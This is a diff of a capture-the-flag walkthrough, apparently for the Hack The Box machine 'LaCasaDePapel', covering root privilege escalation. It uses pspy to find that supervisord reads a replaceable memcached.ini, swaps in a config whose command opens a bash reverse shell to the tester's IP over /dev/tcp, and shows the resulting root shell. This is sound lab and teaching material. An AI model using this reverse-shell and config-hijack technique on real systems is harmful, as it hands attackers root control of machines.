@@ -495,7 +495,7 @@ PID   USER       TIME  COMMAND
 -----
 ```
 
-After letting pspy run for a while, I can see something is definitely starting each certain period of time.
+After letting pspy run for a while, I can see something is definitely starting every so often.
 
 ```bash
 ----
@@ -512,9 +512,9 @@ After letting pspy run for a while, I can see something is definitely starting e
 -----
 ```
 
-I tried to read /etc/supervisord.conf but we don't have enough permissions. I still need a little bit more of information, I'll run pspy with the -f flag for file system events and in the meanwhile I'll search what supervisord is what exactly does it do.
+I tried to read /etc/supervisord.conf but we don't have enough permissions. I still need a little bit more of information, I'll run pspy with the -f flag for file system events and in the meanwhile I'll search what supervisord is and what exactly executes.
 
-In the [man](https://supervisord.org/introduction.html#features) page we can get a clear picture.
+In the [man](https://supervisord.org/introduction.html#supervisor-components) page we can get a clear picture.
 
 > *"Supervisor is a client/server system that allows its users to control a number of processes on UNIX-like operating systems."*
 
@@ -522,10 +522,11 @@ Under the section "Supervisor Components", we have a definition of what supervis
 
 > *"The server piece of supervisor is named supervisord. It is responsible for starting child programs at its own invocation, responding to commands from clients, restarting crashed or exited subprocesseses, logging its subprocess stdout and stderr output, and generating and handling “events” corresponding to points in subprocess lifetimes."*
 
-So, it pretty much runs processes as cron does, that's convenient. Our new pspy scan is revealing a few interesting things too.
+So, supervisord is responsible for managing and restarting processes, similar to how cron automates tasks, but instead of running jobs on a schedule, it ensures that configured services remain running. Our new pspy scan is revealing a few interesting things too. It's way noisier with the -f flag, so I'll snip it for clarity.
 
 ```bash
-2026/01/30 17:59:01 FS:                 OPEN | /etc/supervisord.conf
+----
+2026/01/30 17:59:01 FS:                 OPEN | /etc/supervisord.conf  <--- Supervisord configuration read
 2026/01/30 17:59:01 FS:               ACCESS | /etc/supervisord.conf
 2026/01/30 17:59:01 FS:                 OPEN | /usr/bin/coreutils
 2026/01/30 17:59:01 FS:               ACCESS | /usr/bin/coreutils
@@ -538,11 +539,64 @@ So, it pretty much runs processes as cron does, that's convenient. Our new pspy 
 2026/01/30 17:59:01 FS:           ACCESS DIR | /home/professor/
 2026/01/30 17:59:01 FS:    CLOSE_NOWRITE DIR | /home/professor
 2026/01/30 17:59:01 FS:    CLOSE_NOWRITE DIR | /home/professor/
-2026/01/30 17:59:01 FS:                 OPEN | /home/professor/memcached.ini
+2026/01/30 17:59:01 FS:                 OPEN | /home/professor/memcached.ini <--- At the same time memeached.ini is being read
 2026/01/30 17:59:01 FS:               ACCESS | /home/professor/memcached.ini
 2026/01/30 17:59:01 FS:        CLOSE_NOWRITE | /home/professor/memcached.ini
+----
 ```
 
-From this output I can guess supervisord is starting memcached.ini each certain period of time. We don't have the permissions to edit memcached.ini but we do have permissions over the directory memcached.ini is sitting on. This means that while we can't edit memcached.ini, we can rename it or delete it and put a new memcached.ini in it.
+From this output I can guess supervisord periodically reads memcached.ini. We don't have the permissions to edit memcached.ini but we do have permissions over the directory memcached.ini is sitting on. This means that while we can't edit memcached.ini, we can rename it or delete it and put a new memcached.ini in it.
+
+If this were a normal pentesting situation, I'd make a backup of the original memcached.ini, but as we are in a machine, I'll just make a new memcached.ini quickly and delete the original.
+
+```bash
+lacasadepapel [~]$ rm memcached.ini
+rm: remove write-protected regular file 'memcached.ini'? y
+lacasadepapel [~]$ ls
+linpeas.sh  memcached.js  node_modules  pspy64
+lacasadepapel [~]$ echo -e "[program:memcached]\ncommand = bash -c 'bash -i  >& /dev/tcp/10.10.15.nopeek/443 0>&1'" > me
+mcached.ini
+lacasadepapel [~]$ ls
+linpeas.sh  memcached.ini  memcached.js  node_modules  pspy64
+lacasadepapel [~]$ 
+```
+
+And after waiting a minute or so we've got a shell as root.
+
+```bash
+┌──(kali㉿kali)-[~/hackthebox/lacasadepapel/berlin]
+└─$ nc -lvnp 443             
+listening on [any] 443 ...
+^[[1;5Dconnect to [10.10.15.31] from (UNKNOWN) [10.129.9.87] 40280
+bash: cannot set terminal process group (16345): Not a tty
+bash: no job control in this shell
+bash-4.4# whoami
+5Dwhoami
+bash: 5Dwhoami: command not found
+bash-4.4# whoami
+whoami
+root
+bash-4.4# cd /root
+cd /root
+bash-4.4# ls -la
+ls -la
+total 40
+drwx------  7 root root 4096 Jan 30 17:08 .
+drwxr-xr-x 22 root root 4096 Oct  3  2022 ..
+lrwxrwxrwx  1 root root    9 Nov  6  2018 .ash_history -> /dev/null
+-rw-------  1 root root  911 Oct  3  2022 .bash_history
+drwx------  3 root root 4096 Jan 21  2019 .cache
+drwx------  3 root root 4096 Oct 27  2018 .config
+drwxr-xr-x  3 root root 4096 Oct  3  2022 .node-gyp
+drwxr-xr-x  6 root root 4096 Jan 25  2019 .npm
+-rw-------  1 root root 1024 Nov  6  2018 .rnd
+drwx------  2 root root 4096 Oct 27  2018 .ssh
+-r--------  1 root root   33 Jan 30 17:08 root.txt
+bash-4.4# 
+```
+
+### Why's this machine vulnerable?
+
+
 
 
